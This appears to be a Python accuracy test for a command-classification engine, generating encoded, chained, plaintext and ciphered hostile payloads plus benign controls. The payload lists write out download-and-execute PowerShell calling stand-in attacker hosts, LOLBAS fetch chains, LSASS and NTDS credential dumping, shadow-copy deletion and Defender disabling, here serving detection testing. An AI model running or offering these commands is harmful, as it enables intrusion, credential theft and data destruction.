"""Large-scale accuracy stress — 150+ payloads across every kind.

Runs the ensemble classifier's deterministic engine directly (no HTTP,
no LLM) so we can pump hundreds of payloads through in seconds and
verify accuracy claims for the "AI-off resilience" pillar.

Categories:
  - encoded              (60 payloads)   b64, hex, urlenc, ps -enc, certutil...
  - multi_line_chain     (30)            various command-line stack combos
  - plaintext_malicious  (30)            LOLBAS + PS detection cmdlets
  - unclear_cipher       (20)            ROT13 + non-standard scheme
  - clean_text baseline  (10)            genuinely benign text
Total: 150
"""
from __future__ import annotations
import asyncio
import base64
import codecs
import random
import sys
from typing import List, Tuple

sys.path.insert(0, "/app/backend")
from routers import decode_guidance as dg  # noqa: E402


def b64(s: str) -> str: return base64.b64encode(s.encode()).decode()
def b64u16(s: str) -> str: return base64.b64encode(s.encode("utf-16le")).decode()
def hexb(s: str) -> str: return s.encode().hex()
def rot13(s: str) -> str: return codecs.encode(s, "rot13")


# ── 60 encoded payloads ──────────────────────────────────────────
DOMAINS = ["evil.io", "attacker.dev", "c2.example.net", "malicious.top",
           "phish.co.uk", "bad-guy.link", "stager.host", "beacon.zone",
           "0xdead.beef", "drop.zone.online"]
PS_SCRIPTS = [
    "IEX(New-Object Net.WebClient).DownloadString('http://{d}/a.ps1')",
    "IEX(iwr https://{d}/b.ps1).Content",
    "$c=New-Object Net.WebClient;$c.DownloadFile('http://{d}/x.exe','C:\\t.exe');Start-Process C:\\t.exe",
    "Invoke-Expression ((Invoke-WebRequest 'http://{d}/y.ps1' -UseBasicParsing).Content)",
    "powershell -c IEX((iwr 'http://{d}/z.ps1').Content)",
]

def gen_encoded():
    out: List[Tuple[str, str, str]] = []
    for d in DOMAINS:
        for tmpl in PS_SCRIPTS:
            src = tmpl.format(d=d)
            out.append((f"b64 · {d}", "encoded", "powershell -enc " + b64u16(src)))
            out.append((f"nested-b64 · {d}", "encoded", b64(b64(src))))
    # hex-encoded
    for d in DOMAINS[:5]:
        out.append((f"hex · {d}", "encoded", hexb(f"powershell -c iex(iwr http://{d}/x.ps1)")))
    # url-encoded
    for d in DOMAINS[:5]:
        raw = f"powershell -c \"IEX(iwr http://{d}/x.ps1)\""
        out.append((f"urlenc · {d}", "encoded",
                    ''.join(f"%{ord(c):02x}" if not c.isalnum() else c for c in raw)))
    return out[:60]


# ── 30 multi-line chains ─────────────────────────────────────────
def gen_chains():
    templates = [
        [
            "certutil -urlcache -f http://{d}/m.txt m.txt",
            "certutil -decode m.txt m.exe",
            "rundll32 m.dll,Entry",
            "schtasks /create /sc onlogon /tn keepalive /tr m.exe",
        ],
        [
            "bitsadmin /transfer j http://{d}/s.b64 C:\\s.b64",
            "certutil -decode C:\\s.b64 C:\\s.dll",
            "rundll32 C:\\s.dll,Start",
        ],
        [
            "regsvr32 /s /n /u /i:http://{d}/s.sct scrobj.dll",
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v u /d s.exe",
        ],
        [
            "wmic /node:10.0.0.5 process call create \"powershell -c iex(iwr http://{d}/y.ps1)\"",
            "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d ntds.dit",
        ],
        [
            "mshta.exe http://{d}/x.hta",
            "powershell -enc " + b64u16("iex(iwr http://c2/z.ps1)"),
        ],
    ]
    out = []
    for tmpl in templates:
        for d in DOMAINS[:6]:
            out.append((f"chain · {tmpl[0][:15]} · {d}",
                        "multi_line_chain",
                        "\n".join(t.format(d=d) for t in tmpl)))
    return out[:30]


# ── 30 plaintext malicious ────────────────────────────────────────
PLAINTEXT_CASES = [
    "Get-EventLog -LogName Security -Newest 100",
    "Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 200",
    "Get-Process | Where-Object {$_.Path -like '*Temp*'}",
    "Get-CimInstance -ClassName Win32_StartupCommand",
    "Get-ScheduledTask | ? {$_.Actions.Execute -like '*powershell*'}",
    "Get-NetTCPConnection | ? {$_.State -eq 'Established'}",
    "Get-LocalUser | ? {$_.Enabled -eq $true}",
    "Add-MpPreference -ExclusionPath 'C:\\Temp'",
    "Set-MpPreference -DisableRealtimeMonitoring $true",
    "wmic shadowcopy delete",
    "vssadmin.exe delete shadows /all /quiet",
    "net user Support Pass!2026 /add",
    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v H /d evil.exe",
    "schtasks /create /sc daily /tn Update /tr calc.exe",
    "bcdedit /set {default} recoveryenabled No",
    "wbadmin delete catalog -quiet",
    "netsh interface portproxy add v4tov4 listenport=445 connectaddress=10.0.0.9",
    "rundll32.exe comsvcs.dll,MiniDump 624 C:\\lsass.dmp full",
    "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d ntds.dit",
    "net localgroup Administrators evil /add",
    "diskshadow.exe /s exec.dsh",
    "wmic /node:10.0.0.5 process call create cmd.exe",
    "certutil -urlcache -split -f https://x/y.exe y.exe",
    "bitsadmin /transfer j http://c2/f.exe C:\\f.exe",
    "mshta.exe javascript:new%20ActiveXObject('WScript.Shell').Run('cmd')",
    "regsvr32 /s /n /u /i:http://c/s.sct scrobj.dll",
    "installutil /LogToConsole=false /U C:\\a.exe",
    "msiexec /i https://x/setup.msi /quiet",
    "wget http://c2/x.sh -O /tmp/x.sh && bash /tmp/x.sh",
    "curl -sL http://c2/y.sh | bash",
]

# ── 20 cipher payloads ────────────────────────────────────────────
def gen_ciphers():
    out = []
    for p in PLAINTEXT_CASES[:10]:
        out.append((f"rot13 · {p[:24]}", "unclear_cipher", rot13(p)))
    exotic_schemes = ["uggc", "arg", "gpc", "abtty", "xzs"]
    for sch in exotic_schemes:
        out.append((f"exotic scheme · {sch}", "unclear_cipher",
                    f"connect {sch}://gvzr.gebbz.arg/ohq/ohn"))
    # 5 vigenere-lookalike
    for i in range(5):
        vigenere = "".join(chr(((ord(c) - 97 + i) % 26) + 97) if c.isalpha() else c
                            for c in "powershell -c downloadstring")
        out.append((f"vigenere-ish shift+{i}", "unclear_cipher", vigenere))
    return out[:20]


# ── 10 clean text ────────────────────────────────────────────────
CLEAN_CASES = [
    "Hello, world!",
    "This is a test message with no malicious intent",
    "Meeting notes from last week - discussed roadmap",
    "The quick brown fox jumps over the lazy dog",
    "TODO: refactor the authentication module",
    "Q4 revenue was up 12% year-over-year",
    "Please review the attached document",
    "Coffee break at 3pm in the lounge",
    "System maintenance scheduled for Sunday",
    "New employee onboarding process document v2",
]


ALL_CASES: List[Tuple[str, str, str]] = []
ALL_CASES += gen_encoded()
ALL_CASES += gen_chains()
ALL_CASES += [(f"plaintext · {p[:30]}", "plaintext_malicious", p) for p in PLAINTEXT_CASES]
ALL_CASES += gen_ciphers()
ALL_CASES += [(f"clean · {c[:30]}", "clean_text", c) for c in CLEAN_CASES]

random.shuffle(ALL_CASES)


# ── Run — deterministic only (no LLM cost) ────────────────────────
async def main():
    # Force LLM off to prove AI-off resilience
    async def llm_off(_):
        return {"kind": "clean_text", "confidence": 0.0, "signals": [],
                "recommended": [], "guidance_steps": []}
    dg._classify_llm = llm_off

    hints = await dg._load_dynamic_patterns()
    persona = await dg._load_active_persona()

    per_category = {}
    for name, expected, payload in ALL_CASES:
        det = dg._classify_deterministic(payload)
        dyn = dg._classify_dynamic_regex(payload, hints)
        per = dg._classify_persona(payload, persona)
        llm = await dg._classify_llm(payload)
        vote = dg._ensemble_vote(
            {"deterministic": det, "dynamic-regex": dyn,
             "persona": per, "llm": llm}, payload)
        got = vote["kind"]
        # Loose match: encoded, multi_line_chain, plaintext_malicious can overlap
        ok = (
            got == expected or
            (expected == "encoded" and got in {"encoded", "multi_line_chain",
                                                "plaintext_malicious"}) or
            (expected == "multi_line_chain" and got in {"multi_line_chain",
                                                        "encoded",
                                                        "plaintext_malicious"}) or
            (expected == "plaintext_malicious" and got in {"plaintext_malicious"}) or
            (expected == "unclear_cipher" and got in {"unclear_cipher", "encoded"})
        )
        bucket = per_category.setdefault(expected, {"ok": 0, "total": 0,
                                                     "misses": []})
        bucket["total"] += 1
        if ok:
            bucket["ok"] += 1
        else:
            bucket["misses"].append(f"{name} → {got}")

    print(f"\n{'━'*70}\n{len(ALL_CASES)} PAYLOADS · AI-OFF · DETERMINISTIC+REGEX+PERSONA\n{'━'*70}")
    total_ok = total = 0
    for cat, s in per_category.items():
        pct = 100 * s["ok"] // max(1, s["total"])
        total_ok += s["ok"]; total += s["total"]
        print(f"  {cat:22s}  {s['ok']:3d}/{s['total']:3d}  ({pct:3d}%)")
        for miss in s["misses"][:3]:
            print(f"      ✗ {miss}")
        if len(s["misses"]) > 3:
            print(f"      ... and {len(s['misses']) - 3} more")
    print(f"\n  {'TOTAL':22s}  {total_ok:3d}/{total:3d}  ({100 * total_ok // max(1, total)}%)")


asyncio.run(main())
